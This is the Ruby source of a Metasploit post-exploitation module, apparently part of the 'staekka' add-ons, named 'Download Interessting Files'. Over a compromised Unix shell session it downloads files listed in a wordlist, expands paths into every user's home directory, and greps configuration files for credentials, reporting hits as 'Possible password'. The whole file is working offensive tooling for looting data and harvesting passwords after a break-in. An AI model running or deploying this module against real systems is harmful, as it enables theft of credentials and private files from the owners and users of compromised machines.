require 'msf/core'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/commands'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Staekka
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Download Interessting Files',
                      'Description'   => %q(Download some interessting files),
                      'Author'        => [ 'jot'],
                      'SessionTypes'  => [ 'shell' ]))
    register_options(
      [
        OptBool.new('USE_UPDATEDB', [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('FILES', [ false, 'Wordist of files to download ' + Msf::Config.staekka_path + "/data/wordlists/interessting_files.txt"]),
        OptString.new('DOWNLOAD', [ false, 'Files and/or directories to download']),
        OptInt.new('TIMEOUT', [ false, 'Timeout should be higher on large directories', 300])
      ], self.class
    )
  end

  def run
    timeout = if datastore['TIMEOUT']
                datastore['TIMEOUT']
              else
                60
              end
    timeout = timeout.to_i
    files = {}
    files = files.merge read_config
    files = files.merge add_downloads
    files.each_pair do |file, mesg|
      binary = true
      if mesg
        mesg.strip!
        binary = if mesg.end_with? "|:text"
                   false
                 else
                   true
                 end
        if mesg.start_with?('GREP(/') || mesg.start_with?('CONFGREP(/')
          if mesg =~ /GREP\(\/(.*)\/\)\|:/
            search = Regexp.last_match[1]
          else
            next
          end
          data = read_file(file, false, true, timeout) # grep in text files
          next if data.nil? || data.empty?
          if mesg.start_with?('CONFGREP')
            # remove comments
            data.gsub!(/^\s*#.*$/, '')
          end
          rx = Regexp.new(search)
          data.each_line do |line|
            out = rx.match(line)
            line.chomp!
            next unless out
            print_status file + ' : ' + line
            found = out[1]
            unless found.nil? || found.empty?
              print_good "Possible password: #{found}"
            end
          end
          next
        end

      end

      tmp = download(file, binary, true, timeout)
      if (tmp.class.to_s != 'String') || tmp.empty?
        vprint_warning file + " : could not read file (#{tmp})"
      elsif tmp.end_with? "Permission denied"
        vprint_warning file + " : Permission denied"
      elsif tmp.end_with? "No such file or directory"
        vprint_waring file + " : No such file or directory"
      else
        print_status "downloaded #{file} : #{mesg.to_s.sub(/(\|:(text|data)\s*)/, '')}"
      end
    end
  end

  def add_downloads
    files = {}
    if datastore['DOWNLOAD']
      datastore['DOWNLOAD'].split("\s").each do |file|
        files[file] = nil
      end
    end
    files
  end

  def read_config
    files = {}
    unless ::File.file?(datastore['FILES'].to_s)
      if Msf::Config.staekka_path.to_s.empty?
      #if ENV['STAEKKA_PATH'].to_s.empty?
        raise "cannot read file '#{datastore['FILES']}' You might need to set env STAEKKA_PATH (export STAEKKA_PATH=....)"
      else
        raise "cannot read file '#{datastore['FILES']}'"
      end
    end
    data = ::File.read(datastore['FILES'])
    # remove comments
    # data.gsub!(/^\s*#.*$/, '')

    data.each_line do |line|
      file = ''
      line.gsub!(/#(.*)$/, '')
      line.chomp!
      line.strip!
      next if line.empty?

      if line =~ /^(.*?)\|\|(.*)$/
        file = Regexp.last_match[1]
        mesg = Regexp.last_match[2]
      else
        file = line
        mesg = nil
      end
      next if file.empty?
      if file.start_with? '~/'
        file.sub!("~", '')
        enum_user_directories.each do |home|
          tmp = home + file
          tmp.gsub!('//', '/')
          files[tmp] = mesg
        end
      elsif file.start_with? '/'
        files[file] = mesg
      else
        find_files(file).each do |found|
          files[found] = mesg
        end
      end
    end
    files
  end
end
